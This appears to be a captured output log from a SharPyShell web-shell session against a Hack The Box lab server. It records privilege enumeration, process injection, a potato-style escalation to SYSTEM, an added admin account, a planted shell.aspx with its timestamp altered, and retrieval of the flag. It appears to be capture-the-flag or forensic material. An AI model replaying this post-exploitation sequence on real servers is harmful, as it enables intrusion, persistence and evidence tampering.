@@ -1,0 +1,390 @@
+C:\Windows\Temp
+-------------(1)-------------
+C:\Windows\Temp\x1fvogijp5pyzn7
+-------------(2)-------------
+ Volume in drive C has no label.
+ Volume Serial Number is B0B9-6304
+
+ Directory of C:\Windows\Temp
+
+12/11/2019  20:58    <DIR>          .
+12/11/2019  20:58    <DIR>          ..
+12/11/2019  20:58    <DIR>          x1fvogijp5pyzn7
+               0 File(s)              0 bytes
+               3 Dir(s)  38.334.590.976 bytes free
+
+-------------(3)-------------
+
+
+OS Name                   : Microsoft Windows Server 2012 R2 Standard
+OS Version                : 6.3.9600 N/A Build 9600
+OS Manufacturer           : Microsoft Corporation
+OS Configuration          : Standalone Server
+OS Build Type             : Multiprocessor Free
+Registered Owner          : Windows User
+Registered Organization   : 
+Original Install Date     : 16/12/2018, 14:26:56
+System Boot Time          : 11/11/2019, 08:08:39
+System Manufacturer       : innotek GmbH
+System Model              : VirtualBox
+System Type               : x64-based PC
+Processor(s)              : 1 Processor(s) Installed.,[01]: Intel64 Family 6 
+                            Model 94 Stepping 3 GenuineIntel ~2592 Mhz
+BIOS Version              : innotek GmbH VirtualBox, 01/12/2006
+Windows Directory         : C:\Windows
+System Directory          : C:\Windows\system32
+Boot Device               : \Device\HarddiskVolume1
+System Locale             : it;Italian (Italy)
+Input Locale              : it;Italian (Italy)
+Time Zone                 : (UTC+01:00) Amsterdam, Berlin, Bern, Rome, 
+                            Stockholm, Vienna
+Total Physical Memory     : 8.192 MB
+Available Physical Memory : 6.675 MB
+Virtual Memory: Max Size  : 9.472 MB
+Virtual Memory: Available : 7.526 MB
+Virtual Memory: In Use    : 1.946 MB
+Page File Location(s)     : C:\pagefile.sys
+Domain                    : WORKGROUP
+Hotfix(s)                 : 31 Hotfix(s) Installed.,[01]: KB2862152,[02]: 
+                            KB2868626,[03]: KB2883200,[04]: KB2884846,[05]: 
+                            KB2887595,[06]: KB2892074,[07]: KB2893294,[08]: 
+                            KB2894029,[09]: KB2894179,[10]: KB2898514,[11]: 
+                            KB2898742,[12]: KB2898868,[13]: KB2898871,[14]: 
+                            KB2901101,[15]: KB2901125,[16]: KB2901128,[17]: 
+                            KB2903939,[18]: KB2906956,[19]: KB2908174,[20]: 
+                            KB2911106,[21]: KB2912390,[22]: KB2913270,[23]: 
+                            KB2914218,[24]: KB2919394,[25]: KB2922229,[26]: 
+                            KB2928680,[27]: KB2931358,[28]: KB2931366,[29]: 
+                            KB2939087,[30]: KB3021910,[31]: KB3173424
+Network Card(s)           : 1 NIC(s) Installed.,[01]: Intel(R) PRO/1000 MT 
+                            Desktop Adapter,      Connection Name: Ethernet,   
+                               DHCP Enabled:    Yes,      DHCP Server:     
+                            192.168.200.1,      IP address(es),      [01]: 
+                            192.168.200.8,      [02]: fe80::a53b:c77b:daab:5efd
+Hyper-V Requirements      : A hypervisor has been detected. Features required 
+                            for Hyper-V will not be displayed.
+
+
+
+
+-------------(4)-------------
+
+-------------(5)-------------
+
+USER INFORMATION
+----------------
+
+User Name                  SID                                                          
+========================== =============================================================
+iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+-------------(6)-------------
+
+-------------(7)-------------
+ Volume in drive C has no label.
+ Volume Serial Number is B0B9-6304
+
+ Directory of C:\Windows\Temp\infinity_edge
+
+12/11/2019  20:58    <DIR>          .
+12/11/2019  20:58    <DIR>          ..
+               0 File(s)              0 bytes
+               2 Dir(s)  38.333.825.024 bytes free
+
+-------------(8)-------------
+{{{SharPyShellSuccess}}} File initialized correctly.
+-------------(9)-------------
+File uploaded correctly to: C:\Windows\Temp\x1fvogijp5pyzn7\tbyjzt4vw6y									
+-------------(10)-------------
+{{{SharPyShellSuccess}}} File initialized correctly.
+-------------(11)-------------
+File uploaded correctly to: C:\Windows\Temp\x1fvogijp5pyzn7\3186q1r3kpvk
+-------------(12)-------------
+
+
+[*] Checking for User Has Local Admin Privileges...
+
+
+[*] Checking for User In Local Group with Admin Privileges...
+
+
+[*] Checking for Process Token Privileges...
+
+
+Privilege   : SeImpersonatePrivilege
+Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+TokenHandle : 2240
+ProcessId   : 2492
+Name        : 2492
+Check       : Process Token Privileges
+
+
+
+
+
+[*] Checking for Unquoted Service Paths...
+
+
+[*] Checking for Modifiable Service Files...
+
+
+[*] Checking for Modifiable Services...
+
+
+[*] Checking for %PATH% .dll Hijacks...
+
+
+[*] Checking for AlwaysInstallElevated Registry Key...
+
+
+[*] Checking for Registry Autologons...
+
+
+[*] Checking for Modifiable Registry Autorun...
+
+
+[*] Checking for Modifiable Scheduled Task Files...
+
+
+[*] Checking for Unattended Install Files...
+
+
+[*] Checking for Encrypted web.config Strings...
+
+
+[*] Checking for Encrypted Application Pool Passwords...
+
+
+[*] Checking for McAfee SiteList.xml files...
+
+
+[*] Checking for Cached GPP Files...
+
+-------------(13)-------------
+
+
+	Started process cmd.exe with pid 2764
+
+	Correclty opened a handle on process with pid 2764
+
+	Allocated memory RWX for code of 349184 bytes
+
+	Code written into remote process. Bytes written: 349184
+
+	Thread parameters detected. Starting to allocate memory RW ...
+
+	Allocated memory RW for thread parameters of 528 bytes
+
+	Thread parameters written into remote process. Bytes written: 528
+
+	Using CreateRemoteThread...
+
+	Remote Thread started!
+
+	Code executed and exited correctly
+
+	Process cmd with pid 2764 has been killed
+
+
+-------------(14)-------------
+Testing: {4991d34b-80a1-4291-83b6-3328366b9097} - 48278
+startCOMListener bindresult: 0
+
+[+] authResult: 0
+{4991d34b-80a1-4291-83b6-3328366b9097}: NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+Payload length: 402
+WriteProcessResult: 1; lpnumber: 402
+
+-------------(15)-------------
+
+USER INFORMATION
+----------------
+
+User Name                      SID                                           
+============================== ==============================================
+win-nqb1dmlmhve\admin_infinity S-1-5-21-2264728112-3882918090-1667634578-1043
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Type             SID          Attributes                                                     
+============================================================= ================ ============ ===============================================================
+Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State  
+=============================== ========================================= =======
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
+SeSecurityPrivilege             Manage auditing and security log          Enabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
+SeLoadDriverPrivilege           Load and unload device drivers            Enabled
+SeSystemProfilePrivilege        Profile system performance                Enabled
+SeSystemtimePrivilege           Change the system time                    Enabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled
+SeBackupPrivilege               Back up files and directories             Enabled
+SeRestorePrivilege              Restore files and directories             Enabled
+SeShutdownPrivilege             Shut down the system                      Enabled
+SeDebugPrivilege                Debug programs                            Enabled
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
+SeUndockPrivilege               Remove computer from docking station      Enabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege         Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
+SeTimeZonePrivilege             Change the time zone                      Enabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
+
+
+-------------(16)-------------
+
+
+name        : explorer.exe
+commandline : "C:\Windows\Explorer.EXE" /LOADSAVEDWINDOWS
+processid   : 136
+
+
+
+
+-------------(17)-------------
+
+
+	Trying to open running process with pid 136
+
+	Correclty opened a handle on process explorer.exe with pid 136
+
+	Allocated memory RWX for code of 1024 bytes
+
+	Code written into remote process. Bytes written: 1024
+
+	Using CreateRemoteThread...
+
+	Remote Thread started!
+
+	Code executed left in background as an async thread in the process 'explorer.exe' with pid 136
+
+
+-------------(18)-------------
+ Volume in drive C has no label.
+ Volume Serial Number is B0B9-6304
+
+ Directory of C:\inetpub\wwwroot\webapp
+
+12/11/2019  20:57    <DIR>          .
+12/11/2019  20:57    <DIR>          ..
+12/11/2019  13:46    <DIR>          Microsoft
+12/11/2019  20:57            13.016 shell.aspx
+11/11/2019  19:28               675 upload.aspx
+11/11/2019  19:35               516 Uploadfile.aspx.cs
+               3 File(s)         14.207 bytes
+               3 Dir(s)  38.325.231.616 bytes free
+
+-------------(19)-------------
+ Volume in drive C has no label.
+ Volume Serial Number is B0B9-6304
+
+ Directory of C:\inetpub\wwwroot\webapp
+
+12/11/2019  20:57    <DIR>          .
+12/11/2019  20:57    <DIR>          ..
+12/11/2019  13:46    <DIR>          Microsoft
+12/11/2019  20:57            13.016 shell.aspx
+11/11/2019  19:28               675 upload.aspx
+11/11/2019  19:35               516 Uploadfile.aspx.cs
+               3 File(s)         14.207 bytes
+               3 Dir(s)  38.328.180.736 bytes free
+
+-------------(20)-------------
+ Volume in drive C has no label.
+ Volume Serial Number is B0B9-6304
+
+ Directory of C:\inetpub\wwwroot\webapp
+
+12/11/2019  20:57    <DIR>          .
+12/11/2019  20:57    <DIR>          ..
+12/11/2019  13:46    <DIR>          Microsoft
+12/11/2019  20:57            13.016 shell.aspx
+11/11/2019  19:28               675 upload.aspx
+11/11/2019  19:35               516 Uploadfile.aspx.cs
+               3 File(s)         14.207 bytes
+               3 Dir(s)  38.328.180.736 bytes free
+
+-------------(21)-------------
+
+-------------(22)-------------
+
+-------------(23)-------------
+
+-------------(24)-------------
+ Volume in drive C has no label.
+ Volume Serial Number is B0B9-6304
+
+ Directory of C:\inetpub\wwwroot\webapp
+
+12/11/2019  20:57    <DIR>          .
+12/11/2019  20:57    <DIR>          ..
+12/11/2019  13:46    <DIR>          Microsoft
+11/11/2019  19:28            13.016 shell.aspx
+11/11/2019  19:28               675 upload.aspx
+11/11/2019  19:35               516 Uploadfile.aspx.cs
+               3 File(s)         14.207 bytes
+               3 Dir(s)  38.328.074.240 bytes free
+
+-------------(25)-------------
+HTB{TH1s_1s_N0t_4_TRo11}
+
+-------------(26)-------------
+File Removed-->C:\Windows\Temp\x1fvogijp5pyzn7\tbyjzt4vw6y
+Directory Removed-->C:\Windows\Temp\x1fvogijp5pyzn7
+
+-------------(27)-------------
